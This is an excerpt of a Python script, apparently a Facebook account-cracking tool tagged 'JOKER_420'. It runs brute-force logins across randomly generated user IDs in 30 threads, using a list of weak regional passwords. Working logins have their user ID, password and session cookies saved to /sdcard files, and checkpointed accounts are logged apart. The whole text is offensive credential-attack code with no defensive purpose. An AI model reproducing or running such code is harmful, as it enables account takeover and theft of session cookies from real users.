...
def afg_randome():
	...
	with tred(max_workers=30) as ahd:
		...
		for guru in user:
			ids = kode+guru
			JOKER_420_pass = [ids,guru,'100200','700800','afghanistan','afghan1234','khan123','khan12345','600700','800900','786786','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹']
			ahd.submit(rndm,ids,JOKER_420_pass)
	print(47*'\n\033[1;37m-')
	print('[✓] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/JOKER_420-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/JOKER_420-CP.txt')
	print(47*'-')
	print(' Press Inter To Back Menu')
#---------------------START-CRACK---------------------#
def rndm(ids,JOKER_420_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [𝑴𝑹 𝑱𝑶𝑲𝑬𝑹] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in JOKER_420_pass:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [JOKER_420-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/JOKER_420-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [JOKER_420-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/JOKER_420-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
